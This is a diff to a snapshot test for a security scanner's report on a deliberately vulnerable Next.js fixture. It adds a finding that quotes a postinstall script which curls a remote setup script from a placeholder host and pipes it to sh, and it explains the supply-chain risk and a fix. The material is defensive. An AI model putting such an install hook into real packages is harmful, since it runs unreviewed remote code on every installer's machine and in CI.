@@ -3,7 +3,7 @@ source: crates/reporters/tests/snapshots.rs
 expression: encoded
 ---
 # owlwarden report — fixtures/vulnerable/next-api
-_7 files · 0.120s · 10 high · 10 medium_
+_7 files · 0.120s · 10 high · 11 medium_
 
 ## High
 
@@ -362,8 +362,29 @@ if (allowed.has(origin)) {
 ```
 **Why it matters:** Any origin may call this API and read the response. That is a deliberate choice for a public endpoint and a mistake for anything behind a session — nothing in the source says which this is, so it is reported for you to decide.
 
+### Package declares an install-time script · A08:2021 · ASI04 · CWE-829
+**Where:** `package.json:7:5` (next)
+**Confidence:** likely
+
+```
+   5    "description": "Deliberately vulnerable Next.js App Router fixture. Never deploy this.",
+   6    "scripts": {
+   7      "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"   // ← runs automatically on install (postinstall)
+   8    },
+   9    "dependencies": {
+```
+
+**Fix (next)** — Move the work into an explicit script the developer runs (\`pnpm setup\`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.
+
+```
+// package.json
+"scripts": { "prepare": "next build" }
+// and: pnpm config set ignore-scripts true
+```
+**Why it matters:** \`postinstall\` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread.
+
 ### Dependency version is unpinned · A06:2021 · CWE-1104
-**Where:** `package.json:11:1` (next)
+**Where:** `package.json:14:1` (next)
 **Confidence:** likely
 
 **Fix (next)** — Pin the dependency in package.json and reinstall so the lockfile records it.
